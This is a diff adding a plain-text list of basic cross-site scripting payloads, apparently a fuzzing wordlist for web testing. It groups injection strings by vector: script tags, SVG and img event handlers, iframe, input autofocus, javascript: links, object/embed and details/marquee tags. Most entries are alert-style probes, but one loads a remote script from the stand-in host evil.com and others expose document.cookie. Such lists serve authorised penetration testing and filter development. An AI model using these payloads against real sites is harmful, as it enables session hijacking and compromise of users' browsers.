@@ -1,0 +1,49 @@
+# XSS - Basic Payloads
+
+# Script Tags
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script src="http://evil.com/xss.js"></script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+
+# SVG-based
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg><script>alert(1)</script></svg>
+
+# Image-based
+<img src=x onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<img src=x onerror=alert('XSS')>
+<img/src=x onerror=alert(1)>
+<img src=1 onerror=alert(document.domain)>
+
+# Body/Iframe
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe onload=alert(1)>
+
+# Input/Button
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<button onclick=alert(1)>Click</button>
+
+# Anchor/Link
+<a href="javascript:alert(1)">Click</a>
+<a href=javascript:alert(1)>XSS</a>
+<a onmouseover=alert(1)>Hover</a>
+
+# Object/Embed
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+
+# Details/Marquee
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# Table
+<table background="javascript:alert(1)">
